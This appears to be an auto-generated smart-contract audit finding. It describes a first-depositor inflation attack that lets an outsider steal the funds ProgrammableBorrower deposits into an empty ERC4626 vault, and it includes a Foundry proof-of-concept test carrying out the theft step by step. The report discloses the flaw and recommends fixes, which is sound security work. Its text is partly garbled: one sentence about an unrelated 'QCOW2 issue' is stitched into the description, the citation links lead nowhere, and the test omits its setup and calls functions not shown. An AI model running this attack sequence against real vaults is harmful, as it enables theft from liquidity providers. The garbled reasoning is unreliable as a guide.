### Title
ProgrammableBorrower accepts zero-value ERC4626 shares, enabling first-depositor theft - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary

`ProgrammableBorrower` accepts arbitrary ERC4626 vaults and deposits idle pool principal without validating the shares received. [1](#0-0) [2](#0-1) 

An unprivileged user of a newly configured or empty ERC4626 vault can perform a first-depositor/donation inflation attack before `startEpoch`, causing the programmable borrower to deposit all LP funds while receiving zero or dust shares. [3](#0-2) [4](#0-3) 

### Finding Description

The QCOW2 issue is that a large declared virtual size is trusted without corresponding backing; the analogous surface here is ERC4626 share accounting, where `vault.deposit()` may report success even when rounding and price inflation mean the received shares have little or no backing. [5](#0-4) 

`setVault` only checks the asset and that the old position has been unwound; it does not require a minimum existing share supply, a protected ERC4626 implementation, or a minimum number of shares for the next deposit. [6](#0-5) 

When a new epoch starts, `onStartEpoch` deposits the programmable borrower's complete on-hand balance into the configured vault and then snapshots the pre-deposit asset value as the epoch principal baseline. [7](#0-6) 

`_depositToVault` records the requested principal amount in `epochDepositedToVault`, but it never compares the received `shares`, their `convertToAssets` value, or the post-deposit balance against `_assetAmount`. [2](#0-1) 

For example, if the external vault is empty, an attacker can deposit one wei to mint one share and donate `P` underlying directly to the vault; a later `deposit(P)` mints `P / (P + 1) == 0` shares to `ProgrammableBorrower` under the common proportional ERC4626 formula. [5](#0-4) 

The attacker then redeems the only vault share for the donation plus the pool's deposit, while `epochStartVaultAssets` still records the original `P` as principal and the CDO retains strategy tokens purportedly backed by that amount. [3](#0-2) [8](#0-7) 

At settlement, `_vaultNetInterest` reports a loss because the vault position is empty, but `totalInterestDueNow` floors that negative delta at zero rather than immediately reducing CDO principal. [9](#0-8) 

The missing principal is only discovered when `onStopEpoch` or the CDO attempts to pull enough cash, after which the normal default path can occur. [10](#0-9) [11](#0-10) 

### Impact Explanation

The attacker can steal up to the complete first programmable-borrower vault deposit, less the initial one-unit deposit and the donation used to inflate the vault exchange rate. [5](#0-4) 

With a `P`-asset pool deposit and a `P`-asset donation, the attacker contributes approximately `P + 1` assets and redeems approximately `2P + 1` assets, for a profit of approximately `P` assets. [7](#0-6) 

This breaks the fair-mint and solvency invariant because CDO strategy tokens continue to represent principal that the external vault position no longer backs. [8](#0-7) [9](#0-8) 

Later LP withdrawals or pool closure can default or socialize the loss because `ProgrammableBorrower` holds no recoverable vault shares. [11](#0-10) [12](#0-11) 

### Likelihood Explanation

The attack requires a programmable-borrower deployment to point at an empty or extremely low-supply ERC4626 vault before the first facility deposit, which is permitted by both `initialize` and `setVault`. [13](#0-12) [6](#0-5) 

The attacker does not need any Idle role or KYC status because they interact only with the external ERC4626 vault as an ordinary depositor and then redeem their own shares. [2](#0-1) 

The deposit call has no min-shares, slippage, zero-share, or post-deposit `convertToAssets` check, so the existing guards do not interrupt the transaction after an inflated exchange rate is observed. [2](#0-1) 

### Recommendation

Require a non-empty, vetted ERC4626 vault with sufficient supply or virtual-share protection before enabling it in `initialize` or `setVault`. [13](#0-12) [6](#0-5) 

Change `_depositToVault` to enforce an explicit minimum-share result and post-deposit value check, such as reverting when `shares == 0` or when `convertToAssets(shares)` is materially below `_assetAmount`. [2](#0-1) 

Where supported, use `mint` with a bounded `maxAssets` instead of an unbounded `deposit`, or route deposits through a trusted adapter that supplies min-share and deadline parameters. [14](#0-13) 

### Proof of Concept

The following Foundry fork test demonstrates the accounting flaw with a minimal proportional ERC4626 vault; a live-fork variant can use any configured vault that reaches the same empty or dust-supply state.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ProgrammableBorrower} from
  "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflationERC4626 is ERC20 {
  ERC20 public immutable assetToken;

  constructor(ERC20 asset_) ERC20("Share", "SHARE") {
    assetToken = asset_;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * assetToken.balanceOf(address(this)) / supply;
  }

  function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
    uint256 assetsBefore = assetToken.balanceOf(address(this));
    uint256 supply = totalSupply();
    shares = supply == 0 || assetsBefore == 0 ? assets : assets * supply / assetsBefore;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }

  function maxWithdraw(address owner_) external view returns (uint256) {
    return convertToAssets(balanceOf(owner_));
  }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
  // Reuse the production ProgrammableBorrower setup from
  // test/foundry/ProgrammableBorrowerCreditVault.t.sol.
  ProgrammableBorrower internal borrower;
  InflationERC4626 internal vault;
  ERC20 internal underlying;
  address internal idleCDO;
  address internal attacker = makeAddr("attacker");

  function testEpochDepositCanMintZeroVaultShares() external {
    uint256 poolDeposit = 10_000e6;

    // Honest owner/manager configures a fresh ERC4626 vault while no epoch is active.
    vault = new InflationERC4626(underlying);
    vm.prank(borrower.manager());
    borrower.setVault(address(vault));

    // Attacker is only an external ERC4626 user.
    deal(address(underlying), attacker, poolDeposit + 1);
    vm.startPrank(attacker);
    underlying.approve(address(vault), 1);
    vault.deposit(1, attacker);              // 1 share
    underlying.transfer(address(vault), poolDeposit); // inflate virtual share price
    vm.stopPrank();

    // IdleCDO transfers `poolDeposit` to ProgrammableBorrower, then calls onStartEpoch.
    deal(address(underlying), address(borrower), poolDeposit);
    vm.prank(idleCDO);
    borrower.onStartEpoch(0);

    // 10_000e6 * 1 / (10_000e6 + 1) rounds to zero shares.
    assertEq(vault.balanceOf(address(borrower)), 0);

    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    uint256 stolen = vault.redeem(1, attacker, attacker);

    assertEq(underlying.balanceOf(attacker) - attackerBefore, stolen);
    assertEq(stolen, 2 * poolDeposit + 1);
    assertEq(vault.balanceOf(address(borrower)), 0);

    // The pool-facing loss is present, but only as a zero-floored interest value.
    assertEq(borrower.vaultLoss(), poolDeposit);
    assertEq(borrower.totalInterestDueNow(), 0);
  }
}
```

The assertion sequence demonstrates direct theft of `poolDeposit` and a `poolDeposit` shortfall in the programmable-borrower position without relying on a malicious Idle owner, manager, borrower, oracle, or privileged action. [3](#0-2) [9](#0-8)
